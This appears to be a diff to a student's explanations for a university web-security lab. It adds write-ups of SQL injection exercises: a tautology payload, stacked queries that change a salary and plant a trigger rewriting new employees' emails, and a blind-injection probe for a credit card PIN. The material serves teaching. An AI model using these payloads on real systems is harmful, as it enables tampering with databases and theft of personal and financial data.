@@ -41,12 +41,15 @@ We would let the message first go to the transfer URL. When the URL was accessed
 Part 6 Explanation:
 SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. If I input (' or '1'='1) then the SQL language would become (SELECT * FROM user_data WHERE last_name = '' or '1'='1') this is always true and we can access all the user's information.
 
+
 Part 7 Explanation:
-select userid, password, ssn, salary, email from employee where userid=101; UPDATE employee SET salary = 555000 WHERE userid = 101
-select userid, password, ssn, salary, email from employee where userid=101 or 1=1
-select userid, password, ssn, salary, email from employee where userid=101; CREATE TRIGGER trigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email="ece568-2020@utoronto.ca" WHERE userid = NEW.userid
+SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
+If I input (101; UPDATE employee SET salary = 555000 WHERE userid = 101) then the SQL language would become (select userid, password, ssn, salary, email from employee where userid=101; UPDATE employee SET salary = 555000 WHERE userid = 101) which would change employee 101's salary.
+If I input (101; CREATE TRIGGER trigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email="ece568-2020@utoronto.ca" WHERE userid = NEW.userid) then the SQL language would become (select userid, password, ssn, salary, email from employee where userid=101; CREATE TRIGGER trigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email="ece568-2020@utoronto.ca" WHERE userid = NEW.userid) which would change new employees' email.
+
 
 Part 8 Explanation:
+
 
 Part8:
 101 AND ((select pin from credit where cc_number = 1234123412341234) < <Nnumber1>)
